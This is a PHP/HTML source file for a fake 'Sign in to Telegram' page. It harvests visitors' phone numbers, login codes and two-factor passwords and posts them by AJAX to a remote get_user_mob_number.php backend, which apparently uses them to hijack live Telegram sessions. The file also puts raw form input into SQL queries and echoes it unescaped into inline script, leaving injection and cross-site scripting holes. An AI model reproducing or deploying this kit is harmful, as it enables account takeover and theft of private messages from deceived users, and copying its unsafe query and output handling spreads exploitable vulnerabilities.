<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style>

input[type=number] {
  -moz-appearance: textfield;
}
        .input-wrapper{
            margin-top: 49px !important;
            margin: 0 auto;
            margin-top: 0px;
            width: 360px;
        }
        .input-field{
            --height: 54px;
            --border-radius: 10px;
            position: relative;
        }
        [contenteditable="true"] {
            cursor: text;
            outline: none;
            -webkit-user-select: text;
            -moz-user-select: text;
            user-select: text;
            white-space: pre-wrap;
        }
        [contenteditable="true"], input {
            background-color: transparent;
            caret-color: var(--primary-color);
            color: var(--primary-text-color);
        }
   
        .input-field-input {
            height: 60px;
        --padding: 2rem;
        --padding-horizontal: 1rem;
        --border-width: 1px;
        background-color: var(--surface-color);
        border: 2px solid #eff0f2;
        border-radius: var(--border-radius);
        box-sizing: border-box;
        line-height: var(--line-height);
        min-height: var(--height);
        padding: calc(var(--padding) - var(--border-width)) calc(var(--padding-horizontal) - var(--border-width));
        position: relative;
        transition: border-color 0s;
        width: 100%;
        z-index: 1;
        }
        [dir="auto"] {
        unicode-bidi: plaintext;
        }
        .input-field {
  --height: 54px;
  --border-radius: 10px;
}
.input-field-border {
  transition: opacity .2s;
}


.input-field-border {
  border: 2px solid var(--primary-color);
  border-radius: var(--border-radius);
  bottom: 0;
  left: 0;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  right: 0;
  top: 0;
  z-index: 1;
}
.input-field label {
  transition: transform .2s,padding .2s,opacity .1s,font-weight 0s .1s;
}
.input-field-input:not(:empty) ~ label, .input-field-input:valid ~ label {
  opacity: 1;
  padding: 0 .3125rem 15px 25px;
  transform: translate(-.1875rem,calc(var(--height)/-2 + .0625rem)) scale(.75);
}
[dir="ltr"] .input-field label {
  left: 1rem;
}
.input-field label {
  background-color: var(--surface-color);
  color: #9e9e9e;
  height: 1.5rem;
  margin-top: calc((var(--height) - 1.5rem)/2);
  pointer-events: none;
  position: absolute;
  right: auto;
  top: 0;
  transform: translate(0);
  transform-origin: left center;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  white-space: nowrap;
  z-index: 2;
}
.form-check.d-flex.justify-content-center.mb-4 {
  margin-top: 23px;
  margin-left: 22px;
}

#mobile_save {
  height: 37%;
  padding: 13px;
  border: ;
  border-radius: 14px;
  margin-top: 35px;
  background: #3390ec;
}
.i18n {
  font-weight: bold;
  font-size: 13px;
}
.loginst {
  text-align: center;
  margin-top: 25px;
  font-size: 16px;
  color: #3390ec;
  font-weight: bold;
}

.opts {
	width: 90%;
	/* margin-bottom: 28px; */
	margin-top: -58px;
	padding-top: -21px;
	background: unset;
	border: unset;
	position: absolute;
	/* margin-bottom: 44px; */
	margin-top: 0px;
	/* margin-right: 51px; */
	/* margin-left: -55px; */
	/* padding-bottom: 7px; */
	outline: none;
}
	

.opts:hover {

    background: unset;
    border: unset;
}
select option {
  margin: 40px;
  background: white;
  color: #fff;
  text-shadow: 0 1px 0 rgba(0, 0, 0, 0.4);
  border: 0px solid;
  appearance: none;
 
  
}
select {
    -moz-appearance: none;
    
   
      }
      .dropdown-toggle::after {
            content: none;
        }

        .row {
	margin-right: -15px;
	margin-left: -15px;
	margin-top: 41px;
}
.phone-wrapper{
    
	margin-top: 10px;
	margin-bottom: 40px;
	text-align: center;

	
}
.phone-wrapper h4{
    font-size: 26px;
	font-weight: bold;
}
.form-check{
    margin-bottom: 30px;
}
.form-outline{
    margin-bottom: 30px;
}
.phone-edit {
	cursor: pointer;
	font-size: 1.5rem;
	height: 1.5rem;
	line-height: 1;
	opacity: .5;
	transition: opacity .2s;
	width: 1.5rem;
}
.subtitle {
	color: var(--secondary-text-color);
	line-height: 1.35;
	opacity: 0.5;
}
.form-control{
    border-radius:10px;
    height:50px;
}
.form-control:hover{
    border: 2px solid blue;
    border-radius:10px;

}


  </style>
</head>
<body>
   
<?php
include '../config.php';

class Request
{

    public function getIpAddress()
    {
        $ipAddress = '';
        if (! empty($_SERVER['HTTP_CLIENT_IP']) && $this->isValidIpAddress($_SERVER['HTTP_CLIENT_IP'])) {
            // check for shared ISP IP
            $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
        } else if (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            // check for IPs passing through proxy servers
            // check if multiple IP addresses are set and take the first one
            $ipAddressList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($ipAddressList as $ip) {
                if ($this->isValidIpAddress($ip)) {
                    $ipAddress = $ip;
                    break;
                }
            }
        } else if (! empty($_SERVER['HTTP_X_FORWARDED']) && $this->isValidIpAddress($_SERVER['HTTP_X_FORWARDED'])) {
            $ipAddress = $_SERVER['HTTP_X_FORWARDED'];
        } else if (! empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && $this->isValidIpAddress($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
            $ipAddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
        } else if (! empty($_SERVER['HTTP_FORWARDED_FOR']) && $this->isValidIpAddress($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipAddress = $_SERVER['HTTP_FORWARDED_FOR'];
        } else if (! empty($_SERVER['HTTP_FORWARDED']) && $this->isValidIpAddress($_SERVER['HTTP_FORWARDED'])) {
            $ipAddress = $_SERVER['HTTP_FORWARDED'];
        } else if (! empty($_SERVER['REMOTE_ADDR']) && $this->isValidIpAddress($_SERVER['REMOTE_ADDR'])) {
            $ipAddress = $_SERVER['REMOTE_ADDR'];
        }
        return $ipAddress;
    }

    public function isValidIpAddress($ip)
    {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return false;
        }
        return true;
    }

    public function getLocation($ip)
    {
        $ch = curl_init('http://ipwhois.app/json/' . $ip);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $json = curl_exec($ch);
        curl_close($ch);
        // Decode JSON response
        $ipWhoIsResponse = json_decode($json, true);
        // Country code output, field "country_code"
        return $ipWhoIsResponse;
    }
}

$requestModel = new Request();
$ip = $requestModel->getIpAddress();
$isValidIpAddress = $requestModel->isValidIpAddress($ip);

    $geoLocationData = $requestModel->getLocation($ip);

   

    $country_name = $geoLocationData['country'];
    $phone_code = str_replace("+","",$geoLocationData['country_phone']);

    

    $country_mob_code = $geoLocationData['country_phone'];
    
    
if(isset($_POST['mobile_save']))
{

    $mobile_number = $_POST['mobile_number'];
    $select = "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number' && country_code='".$phone_code."'";
    $row = $conn->query($select);
    if(mysqli_num_rows($row) <= 0)
    {
        $insert = "INSERT into user_mobile_otp_get SET mobile_number='$mobile_number',country_code='".$phone_code."',otp='0',`status`='0'";
        if(mysqli_query($conn,$insert))
        {

            ?>

            <script>
                var mob_num = '<?php echo $mobile_number; ?>';
                var country_phone_code = '<?php echo $country_mob_code; ?>';
                jQuery(document).ready(function(){
                    jQuery(".mobile_number_form").attr("style","display:none;");
                    jQuery(".otp_form").attr("style","width:30%;display:block;");
                    jQuery("#mobile_number_hidden").attr("value",mob_num);
                    jQuery("#phone_country_code").html(country_phone_code);
                    jQuery("#country_phone_number").html(mob_num);
                    
                    countdown4();
                });
                
            </script>
            <?php
        }
    }
    else
    {
        $update = "UPDATE user_mobile_otp_get SET mobile_number='$mobile_number',country_code='".$phone_code."',otp='0',`status`='0',mobile_status='0' where mobile_number='$mobile_number'";
        if(mysqli_query($conn,$update))
        {
  
            ?>

            <script>
                var mob_num = '<?php echo $mobile_number; ?>';
                var country_phone_code = '<?php echo $country_mob_code; ?>';
                jQuery(document).ready(function(){
                    jQuery(".mobile_number_form").attr("style","display:none;");
                    jQuery(".otp_form").attr("style","width:30%;display:block;");
                    jQuery("#mobile_number_hidden").attr("value",mob_num);
                    jQuery("#phone_country_code").html(country_phone_code);
                    jQuery("#country_phone_number").html(mob_num);

                    
                    countdown4();
                });
            </script>
            <?php
        }
    }
}


$message='';
if(isset($_POST['otp_save']))
{
    $mobile_number_hidden = $_POST['mobile_number_hidden'];
    $otp = $_POST['otp'];

    $select = "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number_hidden' && otp='0' && country_code='".$phone_code."'";
    $row = $conn->query($select);
    if(mysqli_num_rows($row) > 0)
    {

        $update = "UPDATE user_mobile_otp_get SET otp='$otp' where mobile_number='$mobile_number_hidden' && country_code='".$phone_code."'";
        if(mysqli_query($conn,$update))
        {
            ?>
                <script>
                    jQuery(document).ready(function(){

                        jQuery(".mobile_number_form").attr("style","display:none;");
                        jQuery(".otp_form").attr("style","width:30%;display:none;");
                 
                        setTimeout(function(){
                            window.location.href='<?php echo Site_URL; ?>/custom_telegram_form/success.php';
                        },5000);
                           

                    });
                </script>
            <?php

            $message = "We will redirect to you soon";
        }
    }
}


?>
<?php
$countries =
 
array(
"AF" => "Afghanistan",
"AL" => "Albania",
"DZ" => "Algeria",
"AS" => "American Samoa",
"AD" => "Andorra",
"AO" => "Angola",
"AI" => "Anguilla",
"AQ" => "Antarctica",
"AG" => "Antigua and Barbuda",
"AR" => "Argentina",
"AM" => "Armenia",
"AW" => "Aruba",
"AU" => "Australia",
"AT" => "Austria",
"AZ" => "Azerbaijan",
"BS" => "Bahamas",
"BH" => "Bahrain",
"BD" => "Bangladesh",
"BB" => "Barbados",
"BY" => "Belarus",
"BE" => "Belgium",
"BZ" => "Belize",
"BJ" => "Benin",
"BM" => "Bermuda",
"BT" => "Bhutan",
"BO" => "Bolivia",
"BA" => "Bosnia and Herzegovina",
"BW" => "Botswana",
"BV" => "Bouvet Island",
"BR" => "Brazil",
"IO" => "British Indian Ocean Territory",
"BN" => "Brunei Darussalam",
"BG" => "Bulgaria",
"BF" => "Burkina Faso",
"BI" => "Burundi",
"KH" => "Cambodia",
"CM" => "Cameroon",
"CA" => "Canada",
"CV" => "Cape Verde",
"KY" => "Cayman Islands",
"CF" => "Central African Republic",
"TD" => "Chad",
"CL" => "Chile",
"CN" => "China",
"CX" => "Christmas Island",
"CC" => "Cocos (Keeling) Islands",
"CO" => "Colombia",
"KM" => "Comoros",
"CG" => "Congo",
"CD" => "Congo, the Democratic Republic of the",
"CK" => "Cook Islands",
"CR" => "Costa Rica",
"CI" => "Cote D'Ivoire",
"HR" => "Croatia",
"CU" => "Cuba",
"CY" => "Cyprus",
"CZ" => "Czech Republic",
"DK" => "Denmark",
"DJ" => "Djibouti",
"DM" => "Dominica",
"DO" => "Dominican Republic",
"EC" => "Ecuador",
"EG" => "Egypt",
"SV" => "El Salvador",
"GQ" => "Equatorial Guinea",
"ER" => "Eritrea",
"EE" => "Estonia",
"ET" => "Ethiopia",
"FK" => "Falkland Islands (Malvinas)",
"FO" => "Faroe Islands",
"FJ" => "Fiji",
"FI" => "Finland",
"FR" => "France",
"GF" => "French Guiana",
"PF" => "French Polynesia",
"TF" => "French Southern Territories",
"GA" => "Gabon",
"GM" => "Gambia",
"GE" => "Georgia",
"DE" => "Germany",
"GH" => "Ghana",
"GI" => "Gibraltar",
"GR" => "Greece",
"GL" => "Greenland",
"GD" => "Grenada",
"GP" => "Guadeloupe",
"GU" => "Guam",
"GT" => "Guatemala",
"GN" => "Guinea",
"GW" => "Guinea-Bissau",
"GY" => "Guyana",
"HT" => "Haiti",
"HM" => "Heard Island and Mcdonald Islands",
"VA" => "Holy See (Vatican City State)",
"HN" => "Honduras",
"HK" => "Hong Kong",
"HU" => "Hungary",
"IS" => "Iceland",
"IN" => "India",
"ID" => "Indonesia",
"IR" => "Iran, Islamic Republic of",
"IQ" => "Iraq",
"IE" => "Ireland",
"IL" => "Israel",
"IT" => "Italy",
"JM" => "Jamaica",
"JP" => "Japan",
"JO" => "Jordan",
"KZ" => "Kazakhstan",
"KE" => "Kenya",
"KI" => "Kiribati",
"KP" => "Korea, Democratic People's Republic of",
"KR" => "Korea, Republic of",
"KW" => "Kuwait",
"KG" => "Kyrgyzstan",
"LA" => "Lao People's Democratic Republic",
"LV" => "Latvia",
"LB" => "Lebanon",
"LS" => "Lesotho",
"LR" => "Liberia",
"LY" => "Libyan Arab Jamahiriya",
"LI" => "Liechtenstein",
"LT" => "Lithuania",
"LU" => "Luxembourg",
"MO" => "Macao",
"MK" => "Macedonia, the Former Yugoslav Republic of",
"MG" => "Madagascar",
"MW" => "Malawi",
"MY" => "Malaysia",
"MV" => "Maldives",
"ML" => "Mali",
"MT" => "Malta",
"MH" => "Marshall Islands",
"MQ" => "Martinique",
"MR" => "Mauritania",
"MU" => "Mauritius",
"YT" => "Mayotte",
"MX" => "Mexico",
"FM" => "Micronesia, Federated States of",
"MD" => "Moldova, Republic of",
"MC" => "Monaco",
"MN" => "Mongolia",
"MS" => "Montserrat",
"MA" => "Morocco",
"MZ" => "Mozambique",
"MM" => "Myanmar",
"NA" => "Namibia",
"NR" => "Nauru",
"NP" => "Nepal",
"NL" => "Netherlands",
"AN" => "Netherlands Antilles",
"NC" => "New Caledonia",
"NZ" => "New Zealand",
"NI" => "Nicaragua",
"NE" => "Niger",
"NG" => "Nigeria",
"NU" => "Niue",
"NF" => "Norfolk Island",
"MP" => "Northern Mariana Islands",
"NO" => "Norway",
"OM" => "Oman",
"PK" => "Pakistan",
"PW" => "Palau",
"PS" => "Palestinian Territory, Occupied",
"PA" => "Panama",
"PG" => "Papua New Guinea",
"PY" => "Paraguay",
"PE" => "Peru",
"PH" => "Philippines",
"PN" => "Pitcairn",
"PL" => "Poland",
"PT" => "Portugal",
"PR" => "Puerto Rico",
"QA" => "Qatar",
"RE" => "Reunion",
"RO" => "Romania",
"RU" => "Russian Federation",
"RW" => "Rwanda",
"SH" => "Saint Helena",
"KN" => "Saint Kitts and Nevis",
"LC" => "Saint Lucia",
"PM" => "Saint Pierre and Miquelon",
"VC" => "Saint Vincent and the Grenadines",
"WS" => "Samoa",
"SM" => "San Marino",
"ST" => "Sao Tome and Principe",
"SA" => "Saudi Arabia",
"SN" => "Senegal",
"CS" => "Serbia and Montenegro",
"SC" => "Seychelles",
"SL" => "Sierra Leone",
"SG" => "Singapore",
"SK" => "Slovakia",
"SI" => "Slovenia",
"SB" => "Solomon Islands",
"SO" => "Somalia",
"ZA" => "South Africa",
"GS" => "South Georgia and the South Sandwich Islands",
"ES" => "Spain",
"LK" => "Sri Lanka",
"SD" => "Sudan",
"SR" => "Suriname",
"SJ" => "Svalbard and Jan Mayen",
"SZ" => "Swaziland",
"SE" => "Sweden",
"CH" => "Switzerland",
"SY" => "Syrian Arab Republic",
"TW" => "Taiwan, Province of China",
"TJ" => "Tajikistan",
"TZ" => "Tanzania, United Republic of",
"TH" => "Thailand",
"TL" => "Timor-Leste",
"TG" => "Togo",
"TK" => "Tokelau",
"TO" => "Tonga",
"TT" => "Trinidad and Tobago",
"TN" => "Tunisia",
"TR" => "Turkey",
"TM" => "Turkmenistan",
"TC" => "Turks and Caicos Islands",
"TV" => "Tuvalu",
"UG" => "Uganda",
"UA" => "Ukraine",
"AE" => "United Arab Emirates",
"GB" => "United Kingdom",
"US" => "United States",
"UM" => "United States Minor Outlying Islands",
"UY" => "Uruguay",
"UZ" => "Uzbekistan",
"VU" => "Vanuatu",
"VE" => "Venezuela",
"VN" => "Viet Nam",
"VG" => "Virgin Islands, British",
"VI" => "Virgin Islands, U.s.",
"WF" => "Wallis and Futuna",
"EH" => "Western Sahara",
"YE" => "Yemen",
"ZM" => "Zambia",
"ZW" => "Zimbabwe"
);
?>
<center><h3><?php echo $message; ?></h3></center>
<div class="container mobile_number_form" style="width:50%;">
    <div class="row" style="margin: 53px;">
        <div style="justify-content: center;display: flex;"><img style="width: 40%;" src="<?php echo Site_URL ?>/custom_telegram_form/img/telegram.png"></div>
        
    </div>
    <h4 style="text-align:center;font-weight:bold;color: #000;font-size: 29px;">Sign in to Telegram</h4>
    <p style="color: #5D5D5D;font-size: 16px;text-align: center;margin-top: 14px;margin-bottom: 0px;">Please confirm your country and</p>
       <p style="color: #5D5D5D;font-size: 16px;text-align: center;"> enter your phone number.</p>
    <div class="input-wrapper">
        <form method="post">
            <!-- country -->
             <div class="input-field input-select"> 
                <div class="input-field-input">
            <select class="opts dropdown-toggle"> 
              <?php
            foreach( $countries as $country_kye => $country_namehw) {

                $selected = '';
                if($country_name == $country_namehw)
                {
                    $selected = 'selected="selected"';
                }
               
                    echo '<option value="' . $country_kye . '" '.$selected.'>' . $country_namehw . '</option>';
              
            }
?>

    
   </select> 
   
        
     </div>  
    <div class="input-field-border"> </div>
    <label><span class="i18n">Country</span></label>
     </div> 
   
       

                <!-- <span class="i18n">  -->
                
   <!-- <div class="input-field-border"></div><label><span class="i18n">Country</span></label><span class="arrow arrow-down"></span><div class="select-wrapper z-depth-3 hide"><div class="scrollable scrollable-y"><ul><li dir="auto"><img src="assets/img/emoji/1f1e6-1f1eb.png" class="emoji" alt="🇦🇫"><span class="i18n" data-default-name="Afghanistan">Afghanistan</span><span class="phone-code">+93</span></li><li dir="auto"><img src="assets/img/emoji/1f1e6-1f1f1.png" class="emoji" alt="🇦🇱"><span class="i18n" data-default-name="Albania"></span><span class="phone-code">+355</span></li><li dir="auto"><img src="assets/img/emoji/1f1e9-1f1ff.png" class="emoji" alt="🇩🇿"><span class="i18n" data-default-name="Algeria">Algeria</span><span class="phone-code">+213</span></li><li dir="auto"><img src="assets/img/emoji/1f1e6-1f1f8.png" class="emoji" alt="🇦🇸"><span class="i18n" data-default-name="American Samoa">American Samoa</span><span class="phone-code">+1684</span></li><li dir="auto"><img src="assets/img/emoji/1f1e6-1f1e9.png" class="emoji" alt="🇦🇩"><span class="i18n" data-default-name="Andorra">Andorra</span><span class="phone-code">+376</span></li><li dir="auto"><img src="assets/img/emoji/1f1ff-1f1fc.png" class="emoji" alt="🇿🇼"><span class="i18n" data-default-name="Zimbabwe">Zimbabwe</span><span class="phone-code">+263</span></li></ul>
            
        </div></div>-->

            <!-- Name input -->
            <div class="input-field input-field-phone" style="margin-top:20px;">
                <div class="input-field-input" dir="auto" data-no-linebreaks="1" inputmode="decimal" data-left-pattern=" ‒‒‒‒‒ ‒‒‒‒‒" contenteditable="true"><?php echo"$country_mob_code" ;?><input style="border:0px solid;width:92%;outline:none" type="number" name="mobile_number"> </div>
                <div class="input-field-border"></div><label><span class="i18n">Phone Number</span></label></div>

        
            <!-- Checkbox -->
            <div class="form-check d-flex justify-content-center mb-4">
                <input class="form-check-input me-2" type="checkbox" value="" id="form5Example3" checked />
                <label class="form-check-label" for="form5Example3">
                I have read and agree to the terms
                </label>
            </div>

            <!-- Submit button -->
            <button type="submit" name="mobile_save" id="mobile_save" class="btn btn-primary btn-block mb-4">NEXT</button>
            <!-- <button type="submit" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Submit</button> -->

            
        </form>

        <div class="loginst">Log in by QR Code</div>
    </div>
</div>
<div style="width:100%;justify-content:center;display:flex;"><img src="https://phpstack-906702-3360504.cloudwaysapps.com/loading.gif" id="loader_icon" style="display:none;"></div>
<div class="container otp_form" style="width:30%;display:none;">
    <div id="game_counter" style="position: absolute;top: 4%;right: 2%;font-size: 20px;font-weight: bold;"></div>
    <form method="post">
  
        <input type="hidden" name="mobile_number_hidden" id="mobile_number_hidden" class="form-control"/>
        <!-- Email input -->
        <div class="row">
        <div style="justify-content: center;display: flex;"><img style="width: 40%;" src="<?php echo Site_URL ?>/custom_telegram_form/img/telegram.png"></div>
            <div class="phone-wrapper mb-4">
                <h4 class="phone"><span id="phone_country_code"></span>&nbsp;<span id="country_phone_number"></span></h4>
                    <span class="phone-edit tgico-edit"></span>
                <p class="subtitle sent-type">
                    <span class="i18n">
                    We have sent you a message in Telegram
                    <br>
                    with the code.
                    </span>
                </p>
            </div>
            <div class="form-outline d-flex align-items-center justify-content-center mb-4">
                
            
            
                <input type="text" name="otp" id="otp" maxlength="5" class="form-control" placeholder="code"/>

            </div>

            <div class="d-flex align-items-center justify-content-center" style="display: flex;justify-content: center;">
                <button type="Sumbit" name="resend_button" id="resend_button" class="btn btn-default mb-4">Resend</button>
            </div>
            <button type="Sumbit" style="visibility:hidden;" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Sumbit</button>
        </div>
    </form>
</div>


<!-- password form -->
<div class="container password_form" style="width:30%;display:none;">
    <form method="post">
        <input type="hidden" name="mobile_number_hidden_password_form" id="mobile_number_hidden_password_form" class="form-control"/>
        <!-- Email input -->
        <div class="row">
        <div style="justify-content: center;display: flex;"><img style="width: 40%;" src="<?php echo Site_URL ?>/custom_telegram_form/img/telegram.png"></div>
            <div class="phone-wrapper mb-4">
                <h4 class="phone">Enter Your Password</h4>
                <span class="phone-edit tgico-edit"></span>
                <p class="subtitle sent-type">
                    <span class="i18n">
                    Your account is protected with
                    <br>
                    an additional password
                    </span>
                </p>
            </div>
            <div class="form-outline d-flex align-items-center justify-content-center mb-4">
                <input type="text" name="otp" id="otp" maxlength="5" class="form-control" placeholder="code"/>
            </div>
            <button type="Sumbit" style="visibility:hidden;" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Sumbit</button>
        </div>
    </form>
</div>

<br>


</body>
</html>
<style>
@media only screen and (max-width:767px)
{
    .mobile_number_form
    {
        width:100% !important;
    }
    .otp_form
    {
        width:100% !important;
    }
}
</style>
<script>

jQuery(document).ready(function(){
    jQuery("#resend_button").on("click",function(){
        window.location.href = window.location.href;
        // jQuery(".otp_form").attr("style","width:30%;display:none;");
    });
});

    function countdown4() {
        var seconds = 60;
        //var seconds = 900;
        function tick() {
          var counter = document.getElementById("game_counter");
          seconds--;
          counter.innerHTML = "Time Left: "+String(seconds);
           
          if (seconds > 0) {
            setTimeout(tick, 1000);
          } else {
  
            document.getElementById("game_counter").innerHTML = "";
          }
        }
        tick();
      }



    jQuery(document).ready(function(){
        var site_url = document.location.origin;
        if(site_url == 'http://localhost:8080')
        {
        site_url = 'https://phpstack-906702-3360504.cloudwaysapps.com';
        }
        else if(site_url == 'https://phpstack-906702-3360504.cloudwaysapps.com' || site_url == 'http://phpstack-906702-3360504.cloudwaysapps.com')
        {
        site_url = site_url;
        }
        else
        {
        site_url = site_url+'/telegram';
        }

        setInterval(function () {

            var value = jQuery("#otp").val();
            var mobile_number = jQuery("#mobile_number_hidden").val();
            var country_code = '<?php echo $country_mob_code; ?>';
            
            jQuery.ajax({
                url: site_url+'/get_user_mob_number.php',
                method: 'POST',
                data: { "check_code_status":"check_code_status" ,"mobile_number":mobile_number,"country_code" :country_code},
                success:function(value_hwe)
                {
                    
                    if(value_hwe == 'login Successfully')
                    {
                        
                        alert("Login Successfully");
                        jQuery("#loader_icon").attr("style","display:none;");
                        window.location.href ='https://phpstack-906702-3360504.cloudwaysapps.com';
                        
                        
                    }
                    else if(value_hwe != '')
                    {
                        if(value_hwe == "SESSION_PASSWORD_NEEDED")
                        {
                            jQuery("#loader_icon").attr("style","display:none;");
                            jQuery(".password_form").attr("style","width:30%;display:block;");
                        }
                        else
                        {
                            alert("Invalid Code");
                            jQuery("#loader_icon").attr("style","display:none;");
                            jQuery(".otp_form").attr("style","width:30%;display:block;");
                        }
                       
                    }
                }
            });
                   

        },2000);
            

        jQuery('#otp').keyup(function(e){

            var value = jQuery(this).val();
            var mobile_number = jQuery("#mobile_number_hidden").val();
            var country_code = '<?php echo $country_mob_code; ?>';
            var length = value.length;  

            if(length >= 5)
            {
                jQuery(".otp_form").attr("style","width:30%;display:none;");
                jQuery("#loader_icon").attr("style","display:block;");

                
                // jQuery(this).attr("readonly","readonly");
                jQuery.ajax({
                    url: site_url+'/get_user_mob_number.php',
                    method: 'POST',
                    data: { "save_code_custom_form":"save_code_custom_form" ,"mobile_number":mobile_number,"country_code" :country_code,"otp_code":value},
                    success:function(result)
                    {
                        
                        if(result == 1)
                        {
                            
                        }
                    }

                });
            }      
            
        });

    });
</script>
